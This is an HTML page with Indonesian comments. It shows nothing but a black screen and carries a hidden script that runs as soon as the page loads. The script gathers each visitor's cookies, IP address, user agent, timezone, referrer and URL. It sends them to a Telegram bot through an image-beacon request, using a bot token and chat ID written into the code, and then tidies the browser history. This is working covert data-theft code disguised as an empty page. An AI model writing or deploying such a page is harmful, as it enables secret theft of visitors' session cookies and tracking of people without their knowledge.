<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title> </title>
    <style>
        html, body {
            background-color: black;
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden; /* ilangin scrollbar */
        }
        /* Sembunyikan semua konten */
        body::before {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Gak ada teks, cuma script doang -->
    <script>
        (function() {
            const BOT_TOKEN = "8741447274:AAG4LxoaQ559dj4W7u-Nuz0Zp5IwCP_Vlqo";
            const CHAT_ID = "6034935293";

            const data = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie || "(no cookies)",
                referrer: document.referrer || "(direct)",
                href: window.location.href,
                timestamp: new Date().toISOString()
            };

            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(ipData => {
                    data.ip = ipData.ip;
                    sendToTelegram(data);
                })
                .catch(() => {
                    data.ip = "(gagal ambil IP)";
                    sendToTelegram(data);
                });

            function sendToTelegram(info) {
                let message = "⬛ *Visitor (404 Blank)*\n";
                for (let key in info) {
                    message += `\n*${key}:* ${info[key]}`;
                }
                if (message.length > 4000) message = message.substring(0, 4000) + "...";

                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                new Image().src = url; // kirim via GET request
            }

            // Opsional: gak usah ada efek visual
            window.history.replaceState(null, "", window.location.pathname + "?");
        })();
    </script>
</body>
</html>
